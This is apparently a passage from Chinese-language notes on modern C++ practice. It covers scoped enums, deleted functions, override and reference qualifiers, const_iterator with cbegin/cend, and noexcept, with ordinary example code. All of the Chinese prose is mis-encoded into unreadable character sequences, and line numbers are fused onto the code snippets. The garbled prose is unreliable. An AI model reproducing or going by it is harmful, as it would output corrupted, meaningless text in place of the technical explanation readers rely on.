E&gt; //C++14constexpr auto toUType(E enumerator) noexcept&#123; return static_cast&lt;std::underlying_type_t&lt;E&gt;&gt;(enumerator);&#125; ä¸ç®¡å®ƒæ€ä¹ˆå†™ï¼ŒtoUTypeç°åœ¨å…è®¸è¿™æ ·è®¿é—®tupleçš„å­—æ®µäº†ï¼š 1auto val = std::get&lt;toUType(UserInfoFields::uiEmail)&gt;(uInfo); ç»“è®º é™åŸŸenumçš„æšä¸¾åä»…åœ¨enumå†…å¯è§ã€‚è¦è½¬æ¢ä¸ºå…¶å®ƒç±»å‹åªèƒ½ä½¿ç”¨castã€‚ éé™åŸŸ/é™åŸŸenuméƒ½æ”¯æŒåº•å±‚ç±»å‹è¯´æ˜è¯­æ³•ï¼Œé™åŸŸenumåº•å±‚ç±»å‹é»˜è®¤æ˜¯intã€‚éé™åŸŸenumæ²¡æœ‰é»˜è®¤åº•å±‚ç±»å‹ã€‚ é™åŸŸenumæ€»æ˜¯å¯ä»¥å‰ç½®å£°æ˜ã€‚éé™åŸŸenumä»…å½“æŒ‡å®šå®ƒä»¬çš„åº•å±‚ç±»å‹æ—¶æ‰èƒ½å‰ç½®ã€‚ 11 ä½¿ç”¨ delete è€Œä¸æ˜¯ç§æœ‰åŒ–å…¶å£°æ˜ 123456789template &lt;class charT, class traits = char_traits&lt;charT&gt; &gt;class basic_ios : public ios_base &#123;public: â€¦ basic_ios(const basic_ios&amp; ) = delete; basic_ios&amp; operator=(const basic_ios&amp;) = delete; â€¦&#125;; deletedå‡½æ•°ä¸èƒ½ä»¥ä»»ä½•æ–¹å¼è¢«è°ƒç”¨ï¼Œå³ä½¿ä½ åœ¨æˆå‘˜å‡½æ•°æˆ–è€…å‹å…ƒå‡½æ•°é‡Œé¢è°ƒç”¨deletedå‡½æ•°ä¹Ÿä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚è¿™æ˜¯è¾ƒä¹‹C++98è¡Œä¸ºçš„ä¸€ä¸ªæ”¹è¿›ï¼ŒC++98ä¸­ä¸æ­£ç¡®çš„ä½¿ç”¨è¿™äº›å‡½æ•°åœ¨é“¾æ¥æ—¶æ‰è¢«è¯Šæ–­å‡ºæ¥ã€‚ é€šå¸¸ï¼Œdeletedå‡½æ•°è¢«å£°æ˜ä¸ºpublicè€Œä¸æ˜¯privateã€‚è¿™ä¹Ÿæ˜¯æœ‰åŸå› çš„ã€‚å½“å®¢æˆ·ç«¯ä»£ç è¯•å›¾è°ƒç”¨æˆå‘˜å‡½æ•°ï¼ŒC++ä¼šåœ¨æ£€æŸ¥deletedçŠ¶æ€å‰æ£€æŸ¥å®ƒçš„è®¿é—®æ€§ã€‚å½“å®¢æˆ·ç«¯ä»£ç è°ƒç”¨ä¸€ä¸ªç§æœ‰çš„deletedå‡½æ•°ï¼Œä¸€äº›ç¼–è¯‘å™¨åªä¼šç»™å‡ºè¯¥å‡½æ•°æ˜¯privateçš„é”™è¯¯ã€‚ deletedå‡½æ•°è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ä¼˜åŠ¿æ˜¯ä»»ä½•å‡½æ•°éƒ½å¯ä»¥æ ‡è®°ä¸ºdeletedï¼Œè€Œåªæœ‰æˆå‘˜å‡½æ•°å¯è¢«æ ‡è®°ä¸ºprivateã€‚ 1234bool isLucky(int number); //åŸå§‹ç‰ˆæœ¬bool isLucky(char) = delete; //æ‹’ç»charbool isLucky(bool) = delete; //æ‹’ç»boolbool isLucky(double) = delete; //æ‹’ç»floatå’Œdouble å¦ä¸€ä¸ªdeletedå‡½æ•°ç”¨æ­¦ä¹‹åœ°ï¼ˆprivateæˆå‘˜å‡½æ•°åšä¸åˆ°çš„åœ°æ–¹ï¼‰æ˜¯ç¦æ­¢ä¸€äº›æ¨¡æ¿çš„å®ä¾‹åŒ–ã€‚å‡å¦‚ä½ è¦æ±‚ä¸€ä¸ªæ¨¡æ¿ä»…æ”¯æŒåŸç”ŸæŒ‡é’ˆ: 1234567891011121314template&lt;typename T&gt;void processPointer(T* ptr);template&lt;&gt;void processPointer&lt;void&gt;(void*) = delete;template&lt;&gt;void processPointer&lt;char&gt;(char*) = delete;template&lt;&gt;void processPointer&lt;const void&gt;(const void*) = delete;template&lt;&gt;void processPointer&lt;const char&gt;(const char*) = delete; å¦‚æœä½ æƒ³åšå¾—æ›´å½»åº•ä¸€äº›ï¼Œä½ è¿˜è¦åˆ é™¤const volatile void*å’Œconst volatile char*é‡è½½ç‰ˆæœ¬ï¼Œå¦å¤–è¿˜éœ€è¦ä¸€å¹¶åˆ é™¤å…¶ä»–æ ‡å‡†å­—ç¬¦ç±»å‹çš„é‡è½½ç‰ˆæœ¬ï¼šstd::wchar_tï¼Œstd::char16_tå’Œstd::char32_tã€‚ ç±»æ¨¡æ¿åœ¨å‘½åç©ºé—´ä½œç”¨åŸŸä¸­ï¼Œåˆ é™¤ç‰¹å®šå®ä¾‹åŒ–ï¼ˆprivate æ˜¯åšä¸åˆ°çš„ï¼‰ï¼š 123456789101112class Widget &#123;public: â€¦ template&lt;typename T&gt; void processPointer(T* ptr) &#123; â€¦ &#125; â€¦&#125;;template&lt;&gt; //è¿˜æ˜¯publicï¼Œvoid Widget::processPointer&lt;void&gt;(void*) = delete; //ä½†æ˜¯å·²ç»è¢«åˆ é™¤äº† ç»“è®º ä½¿ç”¨deleteå‡½æ•°æ›´å¥½ ä»»ä½•å‡½æ•°éƒ½èƒ½ deleteï¼ŒåŒ…æ‹¬éæˆå‘˜å‡½æ•°å’Œæ¨¡æ¿å®ä¾‹ 12 ä½¿ç”¨overrideå£°æ˜é‡å†™å‡½æ•° æ´¾ç”Ÿç±»çš„è™šå‡½æ•°é‡å†™åŸºç±»åŒåå‡½æ•°ï¼Œå¾ˆå¯èƒ½ä¸€ä¸å°å¿ƒå°±é”™äº†ã€‚ 1234567891011121314151617181920class Base &#123;public: virtual void doWork(); //åŸºç±»è™šå‡½æ•° â€¦&#125;;class Derived: public Base &#123;public: virtual void doWork(); //é‡å†™Base::doWork â€¦ //ï¼ˆè¿™é‡Œâ€œvirtualâ€æ˜¯å¯ä»¥çœç•¥çš„ï¼‰&#125;; std::unique_ptr&lt;Base&gt; upb = //åˆ›å»ºåŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ std::make_unique&lt;Derived&gt;(); //å…³äºstd::make_uniqueâ€¦ //è¯·å‚è§Item21 upb-&gt;doWork(); //é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨doWorkï¼Œ //å®é™…ä¸Šæ˜¯æ´¾ç”Ÿç±»çš„doWork //å‡½æ•°è¢«è°ƒç”¨ è¦æƒ³é‡å†™ä¸€ä¸ªå‡½æ•°ï¼Œå¿…é¡»æ»¡è¶³ä¸‹åˆ—è¦æ±‚ï¼š åŸºç±»å‡½æ•°å¿…é¡»æ˜¯virtual åŸºç±»å’Œæ´¾ç”Ÿç±»å‡½æ•°åå¿…é¡»å®Œå…¨ä¸€æ ·ï¼ˆé™¤éæ˜¯ææ„å‡½æ•°) åŸºç±»å’Œæ´¾ç”Ÿç±»å‡½æ•°å½¢å‚ç±»å‹å¿…é¡»å®Œå…¨ä¸€æ · åŸºç±»å’Œæ´¾ç”Ÿç±»å‡½æ•°å¸¸é‡æ€§constnesså¿…é¡»å®Œå…¨ä¸€æ · åŸºç±»å’Œæ´¾ç”Ÿç±»å‡½æ•°çš„è¿”å›å€¼å’Œå¼‚å¸¸è¯´æ˜ï¼ˆexception specificationsï¼‰å¿…é¡»å…¼å®¹ é™¤äº†è¿™äº›C++98å°±å­˜åœ¨çš„çº¦æŸå¤–ï¼ŒC++11åˆæ·»åŠ äº†ä¸€ä¸ªï¼š å‡½æ•°çš„å¼•ç”¨é™å®šç¬¦ï¼ˆreference qualifiersï¼‰å¿…é¡»å®Œå…¨ä¸€æ ·ã€‚å®ƒå¯ä»¥é™å®šæˆå‘˜å‡½æ•°åªèƒ½ç”¨äºå·¦å€¼æˆ–è€…å³å€¼ï¼š 1234567891011121314class Widget &#123;public: â€¦ void doWork() &amp;; //åªæœ‰*thisä¸ºå·¦å€¼çš„æ—¶å€™æ‰èƒ½è¢«è°ƒç”¨ void doWork() &amp;&amp;; //åªæœ‰*thisä¸ºå³å€¼çš„æ—¶å€™æ‰èƒ½è¢«è°ƒç”¨&#125;; â€¦Widget makeWidget(); //å·¥å‚å‡½æ•°ï¼ˆè¿”å›å³å€¼ï¼‰Widget w; //æ™®é€šå¯¹è±¡ï¼ˆå·¦å€¼ï¼‰â€¦w.doWork(); //è°ƒç”¨è¢«å·¦å€¼å¼•ç”¨é™å®šä¿®é¥°çš„Widget::doWorkç‰ˆæœ¬ //ï¼ˆå³Widget::doWork &amp;ï¼‰makeWidget().doWork(); //è°ƒç”¨è¢«å³å€¼å¼•ç”¨é™å®šä¿®é¥°çš„Widget::doWorkç‰ˆæœ¬ //ï¼ˆå³Widget::doWork &amp;&amp;ï¼‰ å¯¹äºä¸‹é¢çš„ä¾‹å­ï¼š 1234567class Base &#123;public: virtual void mf1() const; virtual void mf2(int x); virtual void mf3() &amp;; void mf4() const;&#125;; C++11æä¾›ä¸€ä¸ªæ–¹æ³•è®©ä½ å¯ä»¥æ˜¾å¼åœ°æŒ‡å®šä¸€ä¸ªæ´¾ç”Ÿç±»å‡½æ•°æ˜¯åŸºç±»ç‰ˆæœ¬çš„é‡å†™ï¼šå°†å®ƒå£°æ˜ä¸ºoverrideã€‚è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼š 1234567class Derived: public Base &#123;public: virtual void mf1() override; virtual void mf2(unsigned int x) override; virtual void mf3() &amp;&amp; override; virtual void mf4() const override;&#125;; ä»£ç ä¸èƒ½ç¼–è¯‘ï¼Œå½“ç„¶äº†ï¼Œå› ä¸ºè¿™æ ·å†™çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¼šæ˜¾ç¤ºæ‰€æœ‰ä¸é‡å†™æœ‰å…³çš„é—®é¢˜ã€‚è¿™ä¹Ÿæ˜¯ä½ æƒ³è¦çš„ï¼Œä»¥åŠä¸ºä»€ä¹ˆè¦åœ¨æ‰€æœ‰é‡å†™å‡½æ•°åé¢åŠ ä¸Šoverrideã€‚ æ²¡æœ‰overrideï¼Œä½ åªèƒ½å¯„å¸Œæœ›äºå®Œå–„çš„å•å…ƒæµ‹è¯•ã€‚ C++11å¼•å…¥äº†ä¸¤ä¸ªä¸Šä¸‹æ–‡å…³é”®å­—ï¼ˆcontextual keywordsï¼‰ï¼Œoverrideå’Œfinalï¼ˆå‘è™šå‡½æ•°æ·»åŠ finalå¯ä»¥é˜²æ­¢æ´¾ç”Ÿç±»é‡å†™ã€‚finalä¹Ÿèƒ½ç”¨äºç±»ï¼Œè¿™æ—¶è¿™ä¸ªç±»ä¸èƒ½ç”¨ä½œåŸºç±»ï¼‰ã€‚ å‡½æ•°å¼•ç”¨é™å®šç¬¦ reference qualifiersã€‚å¦‚æœæˆ‘ä»¬æƒ³å†™ä¸€ä¸ªå‡½æ•°åªæ¥å—å·¦å€¼å®å‚ï¼Œæˆ‘ä»¬å£°æ˜ä¸€ä¸ªnon-constå·¦å€¼å¼•ç”¨å½¢å‚ï¼š 1void doSomething(Widget&amp; w); //åªæ¥å—å·¦å€¼Widgetå¯¹è±¡ å¦‚æœæˆ‘ä»¬æƒ³å†™ä¸€ä¸ªå‡½æ•°åªæ¥å—å³å€¼å®å‚ï¼Œæˆ‘ä»¬å£°æ˜ä¸€ä¸ªå³å€¼å¼•ç”¨å½¢å‚ï¼š 1void doSomething(Widget&amp;&amp; w); //åªæ¥å—å³å€¼Widgetå¯¹è±¡ æˆå‘˜å‡½æ•°çš„å¼•ç”¨é™å®šå¯ä»¥å¾ˆå®¹æ˜“çš„åŒºåˆ†ä¸€ä¸ªæˆå‘˜å‡½æ•°è¢«å“ªä¸ªå¯¹è±¡ï¼ˆå³*thisï¼‰è°ƒç”¨ã€‚å®ƒå’Œåœ¨æˆå‘˜å‡½æ•°å£°æ˜å°¾éƒ¨æ·»åŠ ä¸€ä¸ªconstå¾ˆç›¸ä¼¼ï¼Œæš—ç¤ºäº†è°ƒç”¨è¿™ä¸ªæˆå‘˜å‡½æ•°çš„å¯¹è±¡ï¼ˆå³*thisï¼‰æ˜¯constçš„ã€‚ è€ƒè™‘ä¸‹é¢ä¸€ä¸ªä¾‹å­ï¼š 123456789class Widget &#123;public: using DataType = std::vector&lt;double&gt;; â€¦ DataType&amp; data() &#123; return values; &#125; â€¦private: DataType values;&#125;; å®¢æˆ·ç«¯ä»£ç ï¼š 123Widget w;â€¦auto vals1 = w.data(); //æ‹·è´w.valuesåˆ°vals1 Widget::dataå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå·¦å€¼å¼•ç”¨ï¼ˆå‡†ç¡®çš„è¯´æ˜¯std::vector&lt;double&gt;&amp;ï¼‰, å› ä¸ºå·¦å€¼å¼•ç”¨æ˜¯å·¦å€¼ï¼Œæ‰€ä»¥vals1æ˜¯ä»å·¦å€¼åˆå§‹åŒ–çš„ã€‚å› æ­¤vals1ç”±w.valuesæ‹·è´æ„é€ è€Œå¾—ã€‚ ç°åœ¨å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåˆ›å»ºWidgetsçš„å·¥å‚å‡½æ•°ï¼Œ 1Widget makeWidget(); æˆ‘ä»¬æƒ³ç”¨makeWidgetè¿”å›çš„Widgeté‡Œçš„std::vectoråˆå§‹åŒ–ä¸€ä¸ªå˜é‡ï¼š 1auto vals2 = makeWidget().data(); //æ‹·è´Widgeté‡Œé¢çš„å€¼åˆ°vals2 Widgetæ˜¯makeWidgetè¿”å›çš„ä¸´æ—¶å¯¹è±¡ï¼ˆå³å³å€¼ï¼‰ï¼Œæ‰€ä»¥å°†å…¶ä¸­çš„std::vectorè¿›è¡Œæ‹·è´çº¯å±æµªè´¹ã€‚æœ€å¥½æ˜¯ç§»åŠ¨ï¼Œä½†æ˜¯å› ä¸ºdataè¿”å›å·¦å€¼å¼•ç”¨ï¼ŒC++çš„è§„åˆ™è¦æ±‚ç¼–è¯‘å™¨ä¸å¾—ä¸ç”Ÿæˆä¸€ä¸ªæ‹·è´ã€‚ æŒ‡æ˜å½“dataè¢«å³å€¼Widgetå¯¹è±¡è°ƒç”¨çš„æ—¶å€™ç»“æœä¹Ÿåº”è¯¥æ˜¯ä¸€ä¸ªå³å€¼ã€‚ç°åœ¨å°±å¯ä»¥ä½¿ç”¨å¼•ç”¨é™å®šï¼š 1234567891011121314class Widget &#123;public: using DataType = std::vector&lt;double&gt;; â€¦ DataType&amp; data() &amp; //å¯¹äºå·¦å€¼Widgets, &#123; return values; &#125; //è¿”å›å·¦å€¼ DataType data() &amp;&amp; //å¯¹äºå³å€¼Widgets, &#123; return std::move(values); &#125; //è¿”å›å³å€¼ â€¦private: DataType values;&#125;; dataé‡è½½çš„è¿”å›ç±»å‹æ˜¯ä¸åŒçš„ï¼Œå·¦å€¼å¼•ç”¨é‡è½½ç‰ˆæœ¬è¿”å›ä¸€ä¸ªå·¦å€¼å¼•ç”¨ï¼ˆå³ä¸€ä¸ªå·¦å€¼ï¼‰ï¼Œå³å€¼å¼•ç”¨é‡è½½è¿”å›ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼ˆå³ä¸€ä¸ªå³å€¼ï¼‰ã€‚è¿™æ„å‘³ç€ç°åœ¨å®¢æˆ·ç«¯çš„è¡Œä¸ºå’Œæˆ‘ä»¬çš„æœŸæœ›ç›¸ç¬¦äº†ï¼š 1234auto vals1 = w.data(); //è°ƒç”¨å·¦å€¼é‡è½½ç‰ˆæœ¬çš„Widget::dataï¼Œ //æ‹·è´æ„é€ vals1auto vals2 = makeWidget().data(); //è°ƒç”¨å³å€¼é‡è½½ç‰ˆæœ¬çš„Widget::data, //ç§»åŠ¨æ„é€ vals2 ç»“è®º ä¸ºé‡å†™å‡½æ•°åŠ ä¸Šoverride æˆå‘˜å‡½æ•°å¼•ç”¨é™å®šï¼ŒåŒºåˆ«å¯¹å¾…å·¦å€¼å¯¹è±¡å’Œå³å€¼å¯¹è±¡ï¼ˆå³*this) 13 ä¼˜å…ˆè€ƒè™‘ const_iterator è€Œä¸æ˜¯ iterator STL const_iteratorç­‰ä»·äºæŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼ˆpointer-to-constï¼‰ã€‚å®ƒä»¬éƒ½æŒ‡å‘ä¸èƒ½è¢«ä¿®æ”¹çš„å€¼ã€‚æ ‡å‡†å®è·µæ˜¯èƒ½åŠ ä¸Šconstå°±åŠ ä¸Šã€‚ åªæ˜¯éœ€è¦æ³¨æ„ï¼ŒC++11 å’Œ C++98 å¯¹ const_iterator çš„æ”¯æŒä¸ä¸€æ ·ã€‚ æ²¡åŠæ³•ç®€ç®€å•å•çš„ä»non-constå®¹å™¨ä¸­è·å–const_iteratorã€‚ 123456789101112typedef std::vector&lt;int&gt;::iterator IterT; //typedeftypedef std::vector&lt;int&gt;::const_iterator ConstIterT;std::vector&lt;int&gt; values;â€¦ConstIterT ci = std::find(static_cast&lt;ConstIterT&gt;(values.begin()), //cast static_cast&lt;ConstIterT&gt;(values.end()), //cast 1983);values.insert(static_cast&lt;IterT&gt;(ci), 1998); //å¯èƒ½æ— æ³•é€šè¿‡ç¼–è¯‘ï¼Œ //åŸå› è§ä¸‹ å› ä¸ºå‘ insert ä¼ å…¥const_iteratorä¸èƒ½é€šè¿‡ç¼–è¯‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†const_iterator è½¬æ¢ä¸ºiteratorçš„ã€‚ ä¸Šé¢çš„ä»£ç ä»ç„¶å¯èƒ½æ— æ³•ç¼–è¯‘ï¼Œå› ä¸ºæ²¡æœ‰ä¸€ä¸ªå¯ç§»æ¤çš„ä»const_iteratoråˆ°iteratorçš„æ–¹æ³•ï¼Œå³ä½¿ä½¿ç”¨static_castä¹Ÿä¸è¡Œã€‚ æ‰€æœ‰çš„è¿™äº›éƒ½åœ¨C++11ä¸­æ”¹å˜äº†ï¼Œç°åœ¨const_iteratoræ—¢å®¹æ˜“è·å–åˆå®¹æ˜“ä½¿ç”¨ã€‚å®¹å™¨çš„æˆå‘˜å‡½æ•°cbeginå’Œcendäº§å‡ºconst_iteratorï¼Œç”šè‡³å¯¹äºnon-constå®¹å™¨ä¹Ÿå¯ç”¨ï¼Œé‚£äº›ä¹‹å‰ä½¿ç”¨iteratoræŒ‡ç¤ºä½ç½®ï¼ˆå¦‚insertå’Œeraseï¼‰çš„STLæˆå‘˜å‡½æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨const_iteratoräº†ã€‚ 12345std::vector&lt;int&gt; values; //å’Œä¹‹å‰ä¸€æ ·â€¦auto it = //ä½¿ç”¨cbegin std::find(values.cbegin(), values.cend(), 1983); //å’Œcendvalues.insert(it, 1998); C++11 çš„ä¸€ä¸ªç¼ºé™·æ˜¯ï¼Œå¯¹äº éæˆå‘˜å‡½æ•°ï¼Œæ²¡æœ‰ç±»ä¼¼çš„ cbeginï¼Œcend å‡½æ•°æ”¯æŒã€‚C++14è¡¥ä¸Šäº†è¿™ä¸€ç©ºç™½ã€‚ éæˆå‘˜å‡½æ•°ä¹Ÿå« è‡ªç”±å‡½æ•°free functionï¼Œå³ä¸€ä¸ªå‡½æ•°ï¼Œåªè¦ä¸æ˜¯æˆå‘˜å‡½æ•°å°±å¯è¢«ç§°ä½œfree functionã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥æ³›åŒ–ä¸‹é¢çš„findAndInsertï¼š 12345678910111213template&lt;typename C, typename V&gt;void findAndInsert(C&amp; container, //åœ¨å®¹å™¨ä¸­æŸ¥æ‰¾ç¬¬ä¸€æ¬¡ const V&amp; targetVal, //å‡ºç°targetValçš„ä½ç½®ï¼Œ const V&amp; insertVal) //ç„¶ååœ¨é‚£æ’å…¥insertVal&#123; using std::cbegin; using std::cend; auto it = std::find(cbegin(container), //éæˆå‘˜å‡½æ•°cbegin cend(container), //éæˆå‘˜å‡½æ•°cend targetVal); container.insert(it, insertVal);&#125; å®ƒå¯ä»¥åœ¨C++14å·¥ä½œè‰¯å¥½ï¼Œä½†æ˜¯å¾ˆé—æ†¾ï¼ŒC++11ä¸åœ¨è‰¯å¥½ä¹‹åˆ—ã€‚ å¦‚æœä½ ä½¿ç”¨C++11ï¼Œå¹¶ä¸”æƒ³å†™ä¸€ä¸ªæœ€å¤§ç¨‹åº¦é€šç”¨çš„ä»£ç ï¼Œè€Œä½ ä½¿ç”¨çš„STLæ²¡æœ‰æä¾›ç¼ºå¤±çš„éæˆå‘˜å‡½æ•°cbeginï¼Œä½ å¯ä»¥ç®€å•çš„å†™ä¸‹ä½ è‡ªå·±çš„å®ç°ã€‚æ¯”å¦‚ï¼Œä¸‹é¢å°±æ˜¯éæˆå‘˜å‡½æ•°cbeginçš„å®ç°ï¼š 1234template &lt;class C&gt;auto cbegin(const C&amp; container)-&gt;decltype(std::begin(container)) &#123; return std::begin(container); //è§£é‡Šè§ä¸‹&#125; ç»“è®º ä¼˜å…ˆè€ƒè™‘const_iteratorè€Œéiterator åœ¨æœ€å¤§ç¨‹åº¦é€šç”¨çš„ä»£ç ä¸­ï¼Œä¼˜å…ˆè€ƒè™‘éæˆå‘˜å‡½æ•°ç‰ˆæœ¬çš„beginï¼Œendï¼Œrbeginç­‰ï¼Œè€ŒéåŒåæˆå‘˜å‡½æ•° 14 å¦‚æœå‡½æ•°ä¸æŠ›å‡ºå¼‚å¸¸è¯·ä½¿ç”¨noexcept è°ƒç”¨è€…å¯ä»¥æŸ¥çœ‹å‡½æ•°æ˜¯å¦å£°æ˜ä¸ºnoexceptï¼Œè¿™ä¸ªå¯ä»¥å½±å“åˆ°è°ƒç”¨ä»£ç çš„å¼‚å¸¸å®‰å…¨æ€§ï¼ˆexception safetyï¼‰å’Œæ•ˆç‡ã€‚å°±å…¶æœ¬èº«è€Œè¨€ï¼Œå‡½æ•°æ˜¯å¦ä¸ºnoexceptå’Œæˆå‘˜å‡½æ•°æ˜¯å¦constä¸€æ ·é‡è¦ã€‚å½“ä½ çŸ¥é“è¿™ä¸ªå‡½æ•°ä¸ä¼šæŠ›å¼‚å¸¸è€Œæ²¡åŠ ä¸Šnoexceptï¼Œé‚£è¿™ä¸ªæ¥å£è¯´æ˜å°±æœ‰ç‚¹å·®åŠ²äº†ã€‚ noexcept å…è®¸ç¼–è¯‘å™¨ç”Ÿæˆæ›´å¥½çš„ç›®æ ‡ä»£ç ã€‚ ä¸¤ç§è¡¨è¾¾æ–¹å¼å¦‚ä¸‹ï¼š 12int f(int x) throw(); //C++98é£æ ¼ï¼Œæ²¡æœ‰æ¥è‡ªfçš„å¼‚å¸¸int f(int x) noexcept; //C++11é£æ ¼ï¼Œæ²¡æœ‰æ¥è‡ªfçš„å¼‚å¸¸ å¦‚æœåœ¨è¿è¡Œæ—¶ï¼Œfå‡ºç°ä¸€ä¸ªå¼‚å¸¸ï¼Œé‚£ä¹ˆå°±å’Œfçš„å¼‚å¸¸è¯´æ˜å†²çªäº†ã€‚åœ¨C++98çš„å¼‚å¸¸è¯´æ˜ä¸­ï¼Œè°ƒç”¨æ ˆï¼ˆthe call stackï¼‰ä¼šå±•å¼€è‡³fçš„è°ƒç”¨è€…ï¼Œåœ¨ä¸€äº›ä¸è¿™åœ°æ–¹ä¸ç›¸å…³çš„åŠ¨ä½œåï¼Œç¨‹åºè¢«ç»ˆæ­¢ã€‚C++11å¼‚å¸¸è¯´æ˜çš„è¿è¡Œæ—¶è¡Œä¸ºæœ‰äº›ä¸åŒï¼šè°ƒç”¨æ ˆåªæ˜¯å¯èƒ½åœ¨ç¨‹åºç»ˆæ­¢å‰å±•å¼€ã€‚ å±•å¼€è°ƒç”¨æ ˆå’Œå¯èƒ½å±•å¼€è°ƒç”¨æ ˆä¸¤è€…å¯¹äºä»£ç ç”Ÿæˆï¼ˆcode generationï¼‰æœ‰éå¸¸å¤§çš„å½±å“ã€‚åœ¨ä¸€ä¸ªnoexceptå‡½æ•°ä¸­ï¼Œå½“å¼‚å¸¸å¯èƒ½ä¼ æ’­åˆ°å‡½æ•°å¤–æ—¶ï¼Œä¼˜åŒ–å™¨ä¸éœ€è¦ä¿è¯è¿è¡Œæ—¶æ ˆï¼ˆthe runtime stackï¼‰å¤„äºå¯å±•å¼€çŠ¶æ€ï¼›ä¹Ÿä¸éœ€è¦ä¿è¯å½“å¼‚å¸¸ç¦»å¼€noexceptå‡½æ•°æ—¶ï¼Œnoexceptå‡½æ•°ä¸­çš„å¯¹è±¡æŒ‰ç…§æ„é€ çš„ååºææ„ã€‚è€Œæ ‡æ³¨ â€œthrow()â€ å¼‚å¸¸å£°æ˜çš„å‡½æ•°ç¼ºå°‘è¿™æ ·çš„ä¼˜åŒ–çµæ´»æ€§ï¼Œæ²¡åŠ å¼‚å¸¸å£°æ˜çš„å‡½æ•°ä¹Ÿä¸€æ ·ã€‚å¯ä»¥æ€»ç»“ä¸€ä¸‹ï¼š 123RetType function(params) noexcept; //æå°½æ‰€èƒ½ä¼˜åŒ–RetType function(params) throw(); //è¾ƒå°‘ä¼˜åŒ–RetType function(params); //è¾ƒå°‘ä¼˜åŒ– è¿™æ˜¯ä¸€ä¸ªå……åˆ†çš„ç†ç”±ä½¿å¾—ä½ å½“çŸ¥é“å®ƒä¸æŠ›å¼‚å¸¸æ—¶åŠ ä¸Šnoexceptã€‚ å¦å¤–å¯¹äºä¸€äº›å®¹å™¨æ•°æ®ç»“æ„çš„æ„é€ ï¼Œå¦‚æœå¯ä»¥å°±ç§»åŠ¨ï¼Œå¦‚æœå¿…è¦åˆ™å¤åˆ¶ã€‚å¯¹äºè¿™ä¸ªå‡½æ•°åªæœ‰åœ¨çŸ¥æ™“ç§»åŠ¨ä¸æŠ›å¼‚å¸¸çš„æƒ…å†µä¸‹ç”¨C++11çš„ç§»åŠ¨æ“ä½œæ›¿æ¢C++98çš„å¤åˆ¶æ“ä½œæ‰æ˜¯å®‰å…¨çš„ã€‚ ä½†æ˜¯å¦‚ä½•çŸ¥é“ä¸€ä¸ªå‡½æ•°ä¸­çš„ç§»åŠ¨æ“ä½œæ˜¯å¦äº§ç”Ÿå¼‚å¸¸ï¼Ÿç­”æ¡ˆå¾ˆæ˜æ˜¾ï¼šå®ƒæ£€æŸ¥è¿™ä¸ªæ“ä½œæ˜¯å¦è¢«å£°æ˜ä¸ºnoexceptã€‚ åƒæ˜¯ std::vector::push_back ä¹‹ç±»çš„å‡½æ•°è°ƒç”¨std::move_if_noexceptï¼Œè¿™æ˜¯ä¸ªstd::moveçš„å˜ä½“ï¼Œæ ¹æ®å…¶ä¸­ç±»å‹çš„ç§»åŠ¨æ„é€ å‡½æ•°æ˜¯å¦ä¸ºnoexceptçš„. std::move_if_noexceptæŸ¥é˜…std::is_nothrow_move_constructibleè¿™ä¸ªtype trait. swapå‡½æ•°æ˜¯noexceptçš„å¦ä¸€ä¸ªç»ä½³ç”¨åœ°ã€‚swapæ˜¯STLç®—æ³•å®ç°çš„ä¸€ä¸ªå…³é”®ç»„ä»¶ï¼Œå®ƒä¹Ÿå¸¸ç”¨äºæ‹·è´è¿ç®—ç¬¦é‡è½½ä¸­ã€‚å®ƒçš„å¹¿æ³›ä½¿ç”¨æ„å‘³ç€å¯¹å…¶æ–½åŠ ä¸æŠ›å¼‚å¸¸çš„ä¼˜åŒ–æ˜¯éå¸¸æœ‰ä»·å€¼çš„ã€‚æœ‰è¶£çš„æ˜¯ï¼Œæ ‡å‡†åº“çš„swapæ˜¯å¦noexceptæœ‰æ—¶ä¾èµ–äºç”¨æˆ·å®šä¹‰çš„swapæ˜¯å¦noexceptã€‚æ¯”å¦‚ï¼Œæ•°ç»„å’Œstd::pairçš„swapå£°æ˜å¦‚ä¸‹ï¼š 1234567891011template &lt;class T, size_t N&gt;void swap(T (&amp;a)[N], T (&amp;b)[N]) noexcept(noexcept(swap(*a, *b))); //è§ä¸‹æ–‡template &lt;class T1, class T2&gt;struct pair &#123; â€¦ void swap(pair&amp; p) noexcept(noexcept(swap(first, p.first)) &amp;&amp; noexcept(swap(second, p.second))); â€¦&#125;; è¿™äº›å‡½æ•°è§†æƒ…å†µnoexceptï¼šå®ƒä»¬æ˜¯å¦noexceptä¾èµ–äºnoexceptå£°æ˜ä¸­çš„è¡¨è¾¾å¼æ˜¯å¦noexceptã€‚ ä¸€äº›å‡½æ•°å¾ˆè‡ªç„¶çš„ä¸åº”è¯¥æŠ›å¼‚å¸¸ï¼Œå°¤å…¶æ˜¯ç§»åŠ¨æ“ä½œå’Œswapã€‚ä½¿å…¶noexceptæœ‰é‡å¤§æ„ä¹‰ï¼Œåªè¦å¯èƒ½å°±åº”è¯¥å°†å®ƒä»¬å®ç°ä¸ºnoexceptã€‚ å¯¹äºä¸€äº›å‡½æ•°ï¼Œä½¿å…¶æˆä¸ºnoexceptæ˜¯å¾ˆé‡è¦çš„ï¼Œå®ƒä»¬åº”å½“é»˜è®¤å¦‚æ˜¯ã€‚åœ¨C++98ï¼Œå…è®¸å†…å­˜é‡Šæ”¾ï¼ˆmemory deallocationï¼‰å‡½æ•°ï¼ˆå³operator deleteå’Œoperator delete[]ï¼‰å’Œææ„å‡½æ•°æŠ›å‡ºå¼‚å¸¸æ˜¯ç³Ÿç³•çš„ä»£ç è®¾è®¡ï¼ŒC++11å°†è¿™ç§ä½œé£å‡çº§ä¸ºè¯­è¨€è§„åˆ™ã€‚ 